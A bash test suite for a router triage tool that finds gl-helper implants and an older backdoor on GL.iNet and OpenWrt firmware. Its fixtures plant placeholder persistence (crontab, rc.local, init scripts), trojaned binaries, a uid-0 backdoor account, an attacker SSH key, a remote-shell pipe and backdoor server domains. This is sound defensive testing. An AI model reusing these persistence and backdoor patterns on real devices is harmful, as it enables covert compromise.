#!/bin/bash
# Tests for gl-helper-triage.sh on real overlayfs mounts inside an unprivileged user
# namespace (no root needed, Linux >= 5.11):
#
#   unshare -rm bash tests/run-tests.sh
#   KVM_LOWER=/path/to/extracted/rm1pe-1.10.2/rootfs unshare -rm bash tests/run-tests.sh
#
# The OpenWrt scenarios use a small synthetic base image. The KVM scenarios need the
# extracted rootfs of a GL.iNet KVM firmware (e.g. RM1PE 1.10.2) in KVM_LOWER.
set -u
T=$(cd "$(dirname "$0")/.." && pwd)/gl-helper-triage.sh
KVM_LOWER=${KVM_LOWER:-}
BASE=$(mktemp -d)
trap 'umount "$BASE"/*/m 2>/dev/null; rm -rf "$BASE"' EXIT
pass=0 fail=0
ok()  { echo "  PASS: $*"; pass=$((pass+1)); }
bad() { echo "  FAIL: $*"; fail=$((fail+1)); }
expect() { if eval "$2"; then ok "$1"; else bad "$1"; fi; }

# The script under test can be given its own shell and its own tools, so that it runs as
# it does on a device while this file keeps the tools of the machine:
#   TRIAGE_SH="busybox sh" TRIAGE_PATH=/path/to/busybox-applets unshare -rm bash tests/run-tests.sh
TRIAGE_SH=${TRIAGE_SH:-sh}
TRIAGE_PATH=${TRIAGE_PATH:-$PATH}
# shellcheck disable=SC2086 # TRIAGE_SH may be two words ("busybox sh")
triage() { env PATH="$TRIAGE_PATH" $TRIAGE_SH "$T" "$@"; }
if [ "$TRIAGE_PATH" = "$PATH" ]; then echo "script runs with: $TRIAGE_SH, the tools of this machine"; else echo "script runs with: $TRIAGE_SH, tools only from $TRIAGE_PATH"; fi

mkscen() { # name lower
	local d=$BASE/$1
	mkdir -p "$d/u" "$d/w" "$d/m" "$d/out"
	mount -t overlay overlay -o "lowerdir=$2,upperdir=$d/u,workdir=$d/w" "$d/m"
	umount "$d/m"
	echo "$d"
}
mnt() { mount -t overlay overlay -o "lowerdir=$2,upperdir=$1/u,workdir=$1/w" "$1/m"; }
run() { # dir lower mode...
	local d=$1 lo=$2; shift 2
	triage --root "$d/m" --upper "$d/u" --lower "$lo" -o "$d/out" "$@"
}

echo "=== 0. The version and its release time are where the website's guide reads them"
expect "VERSION and RELEASED lines have the form the guide expects" 'grep -qE "^VERSION=[0-9]+\.[0-9]+\$" "$T" && grep -qE "^RELEASED=.20[0-9]{2}-[01][0-9]-[0-3][0-9] [0-2][0-9]:[0-5][0-9] UTC.\$" "$T"'

# ------------------------------------------------------------ OpenWrt base image
OWL=$BASE/openwrt-rom
mkdir -p "$OWL"/{etc/init.d,etc/rc.d,bin,usr/bin,lib/apk/db,etc/crontabs}
echo "DISTRIB_ID='OpenWrt'" >"$OWL/etc/openwrt_release"
printf '# Put your custom commands here\nexit 0\n' >"$OWL/etc/rc.local"
printf '#!/bin/sh\n' >"$OWL/etc/init.d/cron"; printf '#!/bin/sh\n' >"$OWL/etc/init.d/dnsmasq"
printf 'root:x:0:0:root:/root:/bin/ash\ndaemon:*:1:1:daemon:/var:/bin/false\n' >"$OWL/etc/passwd"
echo dummy >"$OWL/bin/busybox"; ln -s busybox "$OWL/bin/netstat"; ln -s busybox "$OWL/bin/login"
mkdir -p "$OWL/etc/uci-defaults"; echo 'uci commit' >"$OWL/etc/uci-defaults/10_firstboot"
printf 'P:busybox\nF:bin\nR:busybox\n\n' >"$OWL/lib/apk/db/installed"
echo openwrt >"$OWL/etc/hostname"
printf '#!/bin/sh /etc/rc.common\nSTART=99\n' >"$OWL/etc/init.d/urandom_seed"
echo lua-interpreter >"$OWL/usr/bin/lua"
mkdir -p "$OWL/lib/upgrade/keep.d"; echo /etc/config/network >"$OWL/lib/upgrade/keep.d/netifd"

if [ -n "$KVM_LOWER" ]; then
echo "=== 1. KVM (RM1PE 1.10.2 base), infected"
D=$(mkscen kvm "$KVM_LOWER"); U=$D/u
mkdir -p "$U"/etc/glinet/.cache "$U"/etc/config/.gl "$U"/etc/crontabs "$U"/usr/bin "$U"/bin "$U"/root/.ssh "$U"/etc/init.d
printf '#!/bin/sh\nwhile :; do sleep 60; done\n' >"$U/etc/glinet/.cache/gl-helper"; chmod 755 "$U/etc/glinet/.cache/gl-helper"
echo payload >"$U/etc/glinet/.cache/gb"; echo payload >"$U/etc/config/.gl/gb"
echo '/etc/glinet/.cache/gl-helper &' >"$U/etc/rc.local"
echo '*/5 * * * * /etc/config/.gl/gb >/dev/null 2>&1' >"$U/etc/crontabs/root"
printf '#!/bin/sh\n# trojan netstat\n' >"$U/usr/bin/netstat"; chmod 755 "$U/usr/bin/netstat"
printf 'fake ls\n' >"$U/bin/ls"; chmod 755 "$U/bin/ls"
cp "$KVM_LOWER/usr/bin/wget" "$U/usr/bin/wget"; echo x >>"$U/usr/bin/wget"
echo 'ssh-ed25519 AAAA attacker' >"$U/root/.ssh/authorized_keys"
printf '#!/bin/sh\n/etc/glinet/.cache/gl-helper\n' >"$U/etc/init.d/S99update-helper"
{ cat "$KVM_LOWER/etc/passwd"; echo 'backdoor:x:0:0::/root:/bin/sh'; } >"$U/etc/passwd"
echo note >"$U/etc/.hidden-note"
cp -a "$KVM_LOWER/etc/hostname" "$U/etc/hostname" 2>/dev/null
mnt "$D" "$KVM_LOWER"
run "$D" "$KVM_LOWER" --check >"$D/check.txt"; rc=$?
cat "$D/check.txt"
expect "check exit 1 (infected)" '[ $rc = 1 ]'
expect "3 markers" '[ $(grep -c "^ *IOC  *marker" "$D/check.txt") = 3 ]'
expect "netstat + ls hijack" 'grep -q "applet-hijack *\/usr\/bin\/netstat" "$D/check.txt" && grep -q "applet-hijack *\/bin\/ls" "$D/check.txt"'
expect "rc.local + crontab + init script reference IOC" '[ $(grep -c "persist-ref" "$D/check.txt") = 3 ] && grep -q "persist-ref *\/etc\/init.d\/S99update-helper" "$D/check.txt"'
expect "wget = REVIEW modified-binary" 'grep -q "REVIEW  *modified-binary *\/usr\/bin\/wget" "$D/check.txt"'
expect "authorized_keys + hidden = REVIEW" 'grep -q "REVIEW  *new *\/root\/.ssh\/authorized_keys" "$D/check.txt" && grep -q "hidden-note" "$D/check.txt"'
expect "uid0 backdoor account" 'grep -A1 "uid0-account" "$D/check.txt" | grep -q backdoor'
expect "identical copy-up (hostname) ignored" '! grep -q "/etc/hostname" "$D/check.txt"'
run "$D" "$KVM_LOWER" --fix >"$D/fix.txt"; rc=$?
sed -n '/== Remediation/,$p' "$D/fix.txt"
expect "fix exit 2 (clean afterwards)" '[ $rc = 2 ]'
A=$(ls "$D"/out/gl-triage-*.tar.gz 2>/dev/null | head -1)
expect "archive exists + sha256 ok" '[ -n "$A" ] && (cd "$D/out" && sha256sum -c "${A##*/}.sha256" >/dev/null)'
expect "archive has implant + trojan netstat + crontab" 'tar -tzf "$A" | grep -q "files/upper/etc/glinet/.cache/gl-helper" && tar -tzf "$A" | grep -q "files/upper/usr/bin/netstat" && tar -tzf "$A" | grep -q "files/merged/etc/crontabs/root"'
expect "archive MANIFEST verifies" 'mkdir -p "$D/x" && tar -C "$D/x" -xzf "$A" && (cd "$D/x/evidence" && sha256sum -c MANIFEST.sha256 >/dev/null)'
expect "markers gone" '[ ! -e "$D/m/etc/glinet/.cache" ] && [ ! -e "$D/m/etc/config/.gl" ]'
expect "rc.local + crontab gone (not in base)" '[ ! -e "$D/m/etc/rc.local" ] && [ ! -e "$D/m/etc/crontabs/root" ]'
expect "netstat restored as busybox symlink" '[ -L "$D/m/usr/bin/netstat" ] && [ "$(readlink "$D/m/usr/bin/netstat")" = "$(readlink "$KVM_LOWER/usr/bin/netstat")" ]'
expect "ls restored as coreutils symlink" '[ -L "$D/m/bin/ls" ] && [ "$(readlink "$D/m/bin/ls")" = coreutils ]'
expect "implant init script removed" '[ ! -e "$D/m/etc/init.d/S99update-helper" ]'
expect "REVIEW items untouched (wget, keys)" '[ -f "$D/m/root/.ssh/authorized_keys" ] && ! cmp -s "$D/m/usr/bin/wget" "$KVM_LOWER/usr/bin/wget"'
run "$D" "$KVM_LOWER" --check >/dev/null; rc=$?
expect "re-check after fix: exit 0" '[ $rc = 0 ]'
umount "$D/m"
else
	echo "=== 1. KVM: skipped (set KVM_LOWER)"
fi

echo; echo "=== 2. OpenWrt router, infected"
D=$(mkscen owrt "$OWL"); U=$D/u
mkdir -p "$U"/etc/config/.gl "$U"/etc/crontabs "$U"/usr/bin "$U"/etc/rc.d "$U"/etc/init.d "$U"/etc/dropbear
echo x >"$U/etc/config/.gl/gl-helper"; echo x >"$U/etc/config/.gl/gb"
echo '0 3 * * * /etc/config/.gl/gl-helper' >"$U/etc/crontabs/root"
printf '/usr/bin/my-led-script\nexit 0\n' >"$U/etc/rc.local"
printf 'trojan\n' >"$U/usr/bin/netstat"; chmod 755 "$U/usr/bin/netstat"
ln -s ../init.d/dnsmasq "$U/etc/rc.d/S19dnsmasq"
printf '#!/bin/sh\n' >"$U/etc/init.d/gl-update"; ln -s ../init.d/gl-update "$U/etc/rc.d/S99gl-update"
echo key >"$U/etc/dropbear/dropbear_ed25519_host_key"
printf '/etc/my-own-file\n/etc/config/.gl/\n' >"$U/etc/sysupgrade.conf"
printf '#!/bin/sh /etc/rc.common\nstart() { /etc/config/.gl/gl-helper & }\n' >"$U/etc/init.d/glhelper"; ln -s ../init.d/glhelper "$U/etc/rc.d/S95glhelper"
mkdir -p "$U/bin"; ln -s /bin/busybox "$U/bin/login"
mnt "$D" "$OWL"
rm "$D/m/etc/uci-defaults/10_firstboot"   # overlay creates a whiteout, like OpenWrt after first boot
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
cat "$D/check.txt"
expect "whiteout really created" '[ -c "$U/etc/uci-defaults/10_firstboot" ]'
expect "whiteout (deleted uci-defaults) not reported" '! grep -q "10_firstboot" "$D/check.txt"'
expect "absolute vs relative symlink to busybox not reported" '! grep -q "/bin/login" "$D/check.txt"'
expect "check exit 1" '[ $rc = 1 ]'
expect "platform openwrt" 'grep -q "Platform  *openwrt" "$D/check.txt"'
expect "markers 2 + crontab + netstat + init script + keep list = 6 IOC" 'grep -q "Summary: IOC=6 " "$D/check.txt" && grep -q "keep-ref *\/etc\/sysupgrade.conf" "$D/check.txt"'
expect "custom rc.local = PERSIST (not IOC)" 'grep -q "PERSIST  *persistence *\/etc\/rc.local" "$D/check.txt"'
expect "known service link S19dnsmasq ignored" '! grep -q "S19dnsmasq" "$D/check.txt"'
expect "benign new service + rc.d link = REVIEW" 'grep -q "REVIEW  *new *\/etc\/rc.d\/S99gl-update" "$D/check.txt" && grep -q "REVIEW  *new *\/etc\/init.d\/gl-update" "$D/check.txt"'
expect "dropbear host key ignored" '! grep -q "host_key" "$D/check.txt"'
expect "recommendation warns about keep-settings" 'grep -q "WITHOUT keeping settings" "$D/check.txt"'
run "$D" "$OWL" --fix >"$D/fix.txt"; rc=$?
sed -n '/== Remediation/,$p' "$D/fix.txt"
expect "fix exit 2" '[ $rc = 2 ]'
expect "rc.local restored to base content" 'cmp -s "$D/m/etc/rc.local" "$OWL/etc/rc.local"'
expect "netstat removed (not in base), /bin/netstat intact" '[ ! -e "$D/m/usr/bin/netstat" ] && [ -L "$D/m/bin/netstat" ]'
expect "crontab + .gl gone" '[ ! -e "$D/m/etc/crontabs/root" ] && [ ! -e "$D/m/etc/config/.gl" ]'
expect "implant service + its rc.d link removed, benign service kept" '[ ! -e "$D/m/etc/init.d/glhelper" ] && [ ! -L "$D/m/etc/rc.d/S95glhelper" ] && [ -f "$D/m/etc/init.d/gl-update" ] && [ -L "$D/m/etc/rc.d/S99gl-update" ] && [ -L "$D/m/etc/rc.d/S19dnsmasq" ]'
expect "sysupgrade.conf: only implant line removed" 'grep -qx "/etc/my-own-file" "$D/m/etc/sysupgrade.conf" && ! grep -q "\.gl" "$D/m/etc/sysupgrade.conf"'
expect "custom rc.local kept in archive" 'tar -xzOf "$(ls "$D"/out/*.tar.gz)" evidence/files/merged/etc/rc.local | grep -q my-led-script'
umount "$D/m"

if [ -n "$KVM_LOWER" ]; then
echo; echo "=== 3. Variant without markers (vendor cleanup would miss it)"
D=$(mkscen nomark "$KVM_LOWER"); U=$D/u
mkdir -p "$U"/etc/crontabs "$U"/usr/bin
echo '*/5 * * * * /etc/config/.gl/gb' >"$U/etc/crontabs/root"
printf 'trojan\n' >"$U/usr/bin/netstat"
mnt "$D" "$KVM_LOWER"
run "$D" "$KVM_LOWER" --check >"$D/check.txt"; rc=$?
grep -E '^ +(IOC|PERSIST|REVIEW|INFO) |Summary|Verdict' "$D/check.txt"
expect "detected without markers (exit 1, IOC=2)" '[ $rc = 1 ] && grep -q "Summary: IOC=2 " "$D/check.txt"'
run "$D" "$KVM_LOWER" --fix >/dev/null; rc=$?
expect "fixed (exit 2)" '[ $rc = 2 ] && [ ! -e "$D/m/etc/crontabs/root" ] && [ -L "$D/m/usr/bin/netstat" ]'
umount "$D/m"

echo; echo "=== 4. Clean KVM"
D=$(mkscen clean "$KVM_LOWER"); mnt "$D" "$KVM_LOWER"
run "$D" "$KVM_LOWER" --check >"$D/check.txt"; rc=$?
grep -E 'Summary|Verdict' "$D/check.txt"
expect "clean: exit 0, IOC=0" '[ $rc = 0 ] && grep -q "Summary: IOC=0 " "$D/check.txt"'
run "$D" "$KVM_LOWER" --fix >"$D/fix.txt"; rc=$?
expect "fix on clean device changes nothing, exit 0" '[ $rc = 0 ] && grep -q "nothing to remediate" "$D/fix.txt" && [ -z "$(ls -A "$D/u")" ]'
run "$D" "$KVM_LOWER" --archive --stdout >"$D/stdout.tar.gz" 2>"$D/stdout.log"; rc=$?
expect "--archive --stdout gives valid tar.gz, log on stderr" '[ $rc = 0 ] && tar -tzf "$D/stdout.tar.gz" | grep -q evidence/report.txt && grep -q "Verdict" "$D/stdout.log"'
expect "the archive's progress is shown, on stderr and not in the archive stream" 'grep -q "archive: fingerprints of every changed file" "$D/stdout.log" && grep -q "archive: packing" "$D/stdout.log"'
umount "$D/m"
else
	echo "=== 3./4. KVM: skipped (set KVM_LOWER)"
fi

echo; echo "=== 5. OpenWrt, netstat installed by a package (apk) -> INFO only"
D=$(mkscen pkg "$OWL"); U=$D/u
mkdir -p "$U/usr/bin" "$U/lib/apk/db"
printf 'real netstat\n' >"$U/usr/bin/netstat"
{ cat "$OWL/lib/apk/db/installed"; printf 'P:net-tools-netstat\nF:usr/bin\nR:netstat\n\n'; } >"$U/lib/apk/db/installed"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
grep -E '^ +(IOC|PERSIST|REVIEW|INFO) |Summary' "$D/check.txt"
expect "package netstat is INFO, exit 0" '[ $rc = 0 ] && grep -q "installed by package net-tools-netstat" "$D/check.txt"'
umount "$D/m"

echo; echo "=== 6. OpenWrt with opkg (firmware 4.x), netstat installed by a package -> INFO only"
OWO=$BASE/openwrt-rom-opkg
cp -a "$OWL" "$OWO"; rm -rf "$OWO/lib/apk"; mkdir -p "$OWO/usr/lib/opkg/info"
D=$(mkscen opkg "$OWO"); U=$D/u
mkdir -p "$U/usr/bin" "$U/usr/lib/opkg/info"
printf 'real netstat\n' >"$U/usr/bin/netstat"
printf '/usr/bin/netstat\n' >"$U/usr/lib/opkg/info/net-tools-netstat.list"
mnt "$D" "$OWO"
run "$D" "$OWO" --check >"$D/check.txt"; rc=$?
grep -E '^ +(IOC|PERSIST|REVIEW|INFO) |Summary' "$D/check.txt"
expect "opkg package netstat is INFO, exit 0" '[ $rc = 0 ] && grep -q "installed by package net-tools-netstat" "$D/check.txt"'
expect "no stray heading in the report" '! grep -q -- "== -n" "$D/check.txt"'
umount "$D/m"

echo; echo "=== 7. OpenWrt, firewall config changed and a new nftables include"
mkdir -p "$OWL/etc/config"
printf "config defaults\n\toption input 'REJECT'\n" >"$OWL/etc/config/firewall"
D=$(mkscen fw "$OWL"); U=$D/u
mkdir -p "$U/etc/config" "$U/etc/nftables.d"
printf "config defaults\n\toption input 'REJECT'\n\nconfig redirect\n\toption name 'evil'\n\toption dest_ip '10.9.9.9'\n" >"$U/etc/config/firewall"
printf '# comment\nchain x { tcp dport 22 accept }\n' >"$U/etc/nftables.d/10-x.nft"
printf 'aa:bb:cc:dd:ee:ff 10.0.0.2 192.168.8.2\n' >"$U/etc/mp_ip_mapping_info"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
sed -n '/== Firewall/,/== Result/p' "$D/check.txt"
expect "changed firewall config = REVIEW with 3 new lines, exit 0" '[ $rc = 0 ] && grep -q "REVIEW  *fw-config  *\/etc\/config\/firewall" "$D/check.txt" && grep -q "3 lines that are not in it" "$D/check.txt"'
expect "new lines are listed, unchanged ones are not" 'grep -q "option dest_ip .10.9.9.9." "$D/check.txt" && ! grep -q "option input" "$D/check.txt"'
expect "new nftables include = REVIEW, comment not listed" 'grep -q "REVIEW  *fw-config  *\/etc\/nftables.d\/10-x.nft" "$D/check.txt" && grep -q "tcp dport 22 accept" "$D/check.txt" && ! grep -q "# comment" "$D/check.txt"'
expect "state file with entries = REVIEW with its time" 'grep -A1 "REVIEW  *state-file  *\/etc\/mp_ip_mapping_info" "$D/check.txt" | grep -q "written 20.* UTC, 39 bytes, AstroWarp off"'
run "$D" "$OWL" --archive >/dev/null
expect "firewall config is in the archive" 'tar -tzf "$(ls "$D"/out/*.tar.gz)" | grep -q "files/merged/etc/config/firewall"'
umount "$D/m"

echo; echo "=== 8. Pipe of the reported remote shell left in /tmp"
D=$(mkscen pipe "$OWL")
mnt "$D" "$OWL"
mkdir -p "$D/m/tmp"; mkfifo "$D/m/tmp/f"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
grep -E -A1 '^ +IOC ' "$D/check.txt"
expect "pipe /tmp/f = IOC, exit 1" '[ $rc = 1 ] && grep -q "IOC  *pipe  *\/tmp\/f" "$D/check.txt" && grep -q "last data 20.* UTC" "$D/check.txt"'
run "$D" "$OWL" --fix >"$D/fix.txt"; rc=$?
expect "fix removes the pipe, exit 2" '[ $rc = 2 ] && [ ! -e "$D/m/tmp/f" ] && grep -q "removed the pipe" "$D/fix.txt"'
umount "$D/m"

echo; echo "=== 8a. Only the shell's pipe: the owner's rc.local and crontab stay (issue 5)"
D=$(mkscen pipeown "$OWL")
mnt "$D" "$OWL"
mkdir -p "$D/m/tmp" "$D/m/etc/crontabs"; mkfifo "$D/m/tmp/f"
printf '/usr/bin/my-own-thing &\nexit 0\n' >"$D/m/etc/rc.local"
echo '0 3 * * * /usr/bin/my-backup' >"$D/m/etc/crontabs/root"
run "$D" "$OWL" --fix >"$D/fix.txt"; rc=$?
grep -E 'left /|removed|restored' "$D/fix.txt"
expect "fix removes the pipe and leaves rc.local and the crontab, exit 2" '[ $rc = 2 ] && [ ! -e "$D/m/tmp/f" ] && grep -q my-own-thing "$D/m/etc/rc.local" && grep -q my-backup "$D/m/etc/crontabs/root" && grep -q "left /etc/rc.local as it is" "$D/fix.txt"'
umount "$D/m"

echo; echo "=== 8b. Blocking the older backdoor's servers is not the backdoor (issue 5)"
D=$(mkscen bdblock "$OWL")
mnt "$D" "$OWL"
mkdir -p "$D/m/etc/config" "$D/m/etc/dnsmasq.d"
printf '127.0.0.1 localhost\n0.0.0.0 cdn.adguardns.com\n::\tup.adguardns.org\n' >"$D/m/etc/hosts"
printf 'address=/adxinsight.com/\naddress=/lede-openproject.org/0.0.0.0\nserver=/openwrt-project.org/\n' >"$D/m/etc/dnsmasq.d/block.conf"
printf "config dnsmasq\n\tlist address '/adguardns.com/0.0.0.0'\n\tlist server '/adguardns.org/'\n" >"$D/m/etc/config/dhcp"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
grep -E -A1 'backdoor-' "$D/check.txt"
expect "block entries are INFO, exit 0, clean verdict" '[ $rc = 0 ] && grep -q "INFO  *backdoor-block  */etc/hosts" "$D/check.txt" && grep -q "INFO  *backdoor-block  */etc/dnsmasq.d/block.conf" "$D/check.txt" && grep -q "INFO  *backdoor-block  */etc/config/dhcp" "$D/check.txt" && ! grep -q "IOC  *backdoor-host" "$D/check.txt"'
echo '203.0.113.7 cdn.adxinsight.com' >>"$D/m/etc/hosts"
echo 'server=/adguardns.com/203.0.113.7' >>"$D/m/etc/dnsmasq.d/block.conf"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "a name with a real address is still IOC, shown in full" '[ $rc = 1 ] && grep -q "IOC  *backdoor-host  */etc/hosts" "$D/check.txt" && grep -q "IOC  *backdoor-host  */etc/dnsmasq.d/block.conf" "$D/check.txt" && grep -q "cdn.adxinsight.com" "$D/check.txt"'
umount "$D/m"

echo; echo "=== 9. Stored SSH client keys and VPN credentials are listed, without their content"
C() { sed -n '/== Credentials/,/== Result/p' "$D/check.txt"; }   # the credentials section only
OWC=$BASE/openwrt-rom-creds
cp -a "$OWL" "$OWC"
# what the firmware ships without any secret: an empty ZeroTier secret, VPN configuration
# without keys, an empty ZeroTier directory (KVM)
mkdir -p "$OWC/etc/config" "$OWC/etc/kvmd/user/zerotier"
printf "config zerotier 'sample_config'\n\toption enabled '0'\n\toption secret ''\n" >"$OWC/etc/config/zerotier"
printf "config providers 'FromApp'\n\toption auth_type '1'\n" >"$OWC/etc/config/wireguard"
printf "config servers 'main_server'\n\toption port '51820'\n" >"$OWC/etc/config/wireguard_server"
printf '#!/bin/sh\necho "Public key portion is:"\necho "ssh-ed25519 AAAATESTPUB root@test"\necho "Fingerprint: SHA256:TESTFINGERPRINT"\n' >"$OWC/usr/bin/dropbearkey"; chmod 755 "$OWC/usr/bin/dropbearkey"
D=$(mkscen nocreds "$OWC")
mnt "$D" "$OWC"
run "$D" "$OWC" --check >"$D/check.txt"; rc=$?
expect "firmware defaults without secrets: no credentials section, exit 0" '[ $rc = 0 ] && ! grep -q "Credentials on this device" "$D/check.txt"'
umount "$D/m"

D=$(mkscen creds "$OWC"); U=$D/u
mkdir -p "$U/root/.ssh" "$U/etc/config" "$U/etc/openvpn/profiles/office/auth" "$U/etc/tailscale" "$U/etc/kvmd/user/zerotier" "$U/var/lib"
echo SECRETKEYDATA >"$U/root/.ssh/id_dropbear"; echo SECRETKEYDATA >"$U/root/.ssh/id_ed25519"
echo 'ssh-ed25519 AAAA root@test' >"$U/root/.ssh/id_ed25519.pub"
echo SECRETKEYDATA >"$U/root/.ssh/id_$(printf 'odd\tname')"
printf "config groups 'group_1'\n\toption private_key 'SECRETWGKEY1'\n\nconfig peers 'peer_2'\n\toption private_key 'SECRETWGKEY2'\n\nconfig peers 'peer_3'\n\toption group_id '1'\n" >"$U/etc/config/wireguard"
printf "config servers 'main_server'\n\toption private_key 'SECRETWGKEY3'\n" >"$U/etc/config/wireguard_server"
echo SECRETOVPN >"$U/etc/openvpn/profiles/office/a.ovpn"; echo SECRETOVPN >"$U/etc/openvpn/profiles/office/b.ovpn"
echo SECRETLOGIN >"$U/etc/openvpn/profiles/office/auth/username_password.txt"
printf "config zerotier 'gl'\n\toption enabled '1'\n\toption secret 'SECRETZTID'\n" >"$U/etc/config/zerotier"
echo SECRETZTID >"$U/etc/kvmd/user/zerotier/identity.secret"; ln -s ../../etc/kvmd/user/zerotier "$U/var/lib/zerotier-one"
echo SECRETSTATE >"$U/etc/tailscale/tailscaled.state"
mnt "$D" "$OWC"
run "$D" "$OWC" --check >"$D/check.txt"; rc=$?
C
expect "credentials alone are no indicator: exit 0, IOC=0 PERSIST=0" '[ $rc = 0 ] && grep -q "Summary: IOC=0 PERSIST=0 " "$D/check.txt"'
expect "three SSH client keys with fingerprint, .pub not listed" '[ $(C | grep -c "SSH client key") = 3 ] && C | grep -q "/root/.ssh/id_dropbear" && [ $(C | grep -c "SHA256:TESTFINGERPRINT") = 3 ] && ! C | grep -q "id_ed25519.pub"'
expect "a key name with a tab in it is printed with plain characters only" 'C | grep -q "/root/.ssh/id_odd?name$" && ! C | grep -q "$(printf "\\t")"'
expect "WireGuard: 2 client keys, 1 server key" 'C | grep -A1 "WireGuard client  */etc/config/wireguard$" | grep -q "2 private key" && C | grep -A1 "WireGuard server" | grep -q "1 private key"'
expect "OpenVPN: 2 client profiles" 'C | grep -A1 "OpenVPN client" | grep -q "2 profile"'
expect "ZeroTier identity listed once, from the configuration" '[ $(C | grep -c "^ *ZeroTier") = 1 ] && C | grep -q "ZeroTier  */etc/config/zerotier"'
expect "Tailscale state of the router" 'C | grep -q "Tailscale  */etc/tailscale/tailscaled.state"'
expect "no key content or public key anywhere in the output" '! grep -q "SECRET\|AAAATESTPUB" "$D/check.txt"'
expect "no advice to revoke without indicators" '! grep -q "listed above under" "$D/check.txt" && ! grep -q "treat all of these as copied" "$D/check.txt"'
mkdir -p "$D/m/tmp"; mkfifo "$D/m/tmp/f"
run "$D" "$OWC" --check >"$D/check2.txt"; rc=$?
expect "with an indicator: exit 1, the advice to revoke and a pointer to the list" '[ $rc = 1 ] && grep -q "treat all of these as copied" "$D/check2.txt" && grep -q "listed above under" "$D/check2.txt"'
umount "$D/m"

D=$(mkscen kvmcreds "$OWL"); U=$D/u
mkdir -p "$U/root/.ssh" "$U/etc/kvmd/user/zerotier" "$U/var/lib"
echo SECRETKEYDATA >"$U/root/.ssh/id_rsa"
echo SECRETZTID >"$U/etc/kvmd/user/zerotier/identity.secret"; ln -s ../../etc/kvmd/user/zerotier "$U/var/lib/zerotier-one"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
C
expect "KVM layout: identity file listed once" '[ $(C | grep -c "^ *ZeroTier") = 1 ] && C | grep -q "ZeroTier  */etc/kvmd/user/zerotier/identity.secret"'
expect "no dropbearkey in the base image: key listed without fingerprint" 'C | grep -A1 "SSH client key  */root/.ssh/id_rsa" | grep -q "fingerprint not available"'
umount "$D/m"

echo "=== older backdoor (urandom_seed / ulogd / monitord)"
backdoor() { # upper dir
	mkdir -p "$1/etc/init.d" "$1/bin" "$1/usr/bin" "$1/lib/upgrade/keep.d"
	printf '#!/bin/sh /etc/rc.common\ncp /usr/bin/lua /usr/bin/monitord\ncp /bin/ulogd /var/run/monitord.pid\n/usr/bin/monitord /var/run/monitord.pid &\nSTART=99\n' >"$1/etc/init.d/urandom_seed"
	echo bytecode >"$1/bin/ulogd"; echo lua-interpreter >"$1/usr/bin/monitord"
	printf '/etc/config/network\n/bin/ulogd\n/etc/init.d/urandom_seed\n' >"$1/lib/upgrade/keep.d/netifd"
}
D=$(mkscen bd "$OWL"); U=$D/u
backdoor "$U"
mkdir -p "$U/etc/AdGuardHome/data"; echo '{"QH":"up.adguardns.org"}' >"$U/etc/AdGuardHome/data/querylog.json"
echo '1.2.3.4 cdn.lede-openproject.org' >"$U/etc/hosts"
mkdir -p "$U/etc/config"; printf 'x http://up.adsanalypro.com/\n' >"$U/etc/config/other"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "the server name of the second build (RemoteToHome) is IOC too" 'grep -A1 "IOC  *backdoor-host  */etc/config/other" "$D/check.txt" | grep -q "up.adsanalypro.com"'
expect "the advice names it among the servers to block, and a reinstall from an own file" 'grep -q "adsanalypro.com" "$D/check.txt" && grep -q "downloaded yourself" "$D/check.txt"'
expect "with its start script in place the loader is not called a remnant" '! grep -q "no longer started at boot" "$D/check.txt"'
expect "backdoor only: exit 1 and its own verdict" '[ $rc = 1 ] && grep -q "Verdict: INFECTED - older backdoor" "$D/check.txt" && grep -q "no gl-helper indicators found" "$D/check.txt"'
expect "init script, loader, renamed Lua and keep list are IOC" 'grep -q "IOC  *backdoor-init  */etc/init.d/urandom_seed" "$D/check.txt" && grep -q "IOC  *backdoor-file  */bin/ulogd" "$D/check.txt" && grep -q "IOC  *backdoor-file  */usr/bin/monitord" "$D/check.txt" && grep -q "IOC  *backdoor-keep  */lib/upgrade/keep.d/netifd" "$D/check.txt"'
expect "server name in the configuration is IOC, in the query log REVIEW" 'grep -q "IOC  *backdoor-host  */etc/hosts" "$D/check.txt" && grep -q "REVIEW  *backdoor-dns" "$D/check.txt"'
expect "no second finding for the same path" '[ $(grep -c " /bin/ulogd$" "$D/check.txt") = 1 ] && [ $(grep -c " /etc/init.d/urandom_seed$" "$D/check.txt") = 1 ]'
expect "advice is a reflash without keeping settings" 'grep -q "keep settings.* OFF" "$D/check.txt"'
run "$D" "$OWL" --fix >"$D/fix.txt"; rc=$?
expect "--fix changes nothing and says so: exit 1, files still there" '[ $rc = 1 ] && grep -q "does not remove the older backdoor" "$D/fix.txt" && [ -f "$D/m/bin/ulogd" ] && grep -q monitord "$D/m/etc/init.d/urandom_seed"'
expect "the loader is in the archive" 'tar -tzf "$(ls "$D"/out/*.tar.gz | head -n 1)" | grep -q "bin/ulogd"'
umount "$D/m"

D=$(mkscen bdboth "$OWL"); U=$D/u
backdoor "$U"
mkdir -p "$U/etc/config/.gl"; echo payload >"$U/etc/config/.gl/gl-helper"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"
expect "both: one verdict that names both" 'grep -q "Verdict: INFECTED - gl-helper indicators and the older backdoor" "$D/check.txt"'
run "$D" "$OWL" --fix >"$D/fix.txt"; rc=$?
expect "both: --fix removes gl-helper, leaves the backdoor, exit 3" '[ $rc = 3 ] && [ ! -e "$D/m/etc/config/.gl" ] && [ -f "$D/m/bin/ulogd" ] && grep -q "older backdoor is STILL THERE" "$D/fix.txt"'
umount "$D/m"

D=$(mkscen bdclean "$OWL"); U=$D/u
mkdir -p "$U/usr/sbin" "$U/etc/init.d" "$U/lib/apk/db" "$U/lib/upgrade/keep.d" "$U/usr/bin"
echo real >"$U/usr/sbin/ulogd"; printf '#!/bin/sh\n/usr/sbin/ulogd -d\n' >"$U/etc/init.d/ulogd"
printf 'P:busybox\nF:bin\nR:busybox\n\nP:ulogd\nF:usr/sbin\nR:ulogd\nF:etc/init.d\nR:ulogd\n\n' >"$U/lib/apk/db/installed"
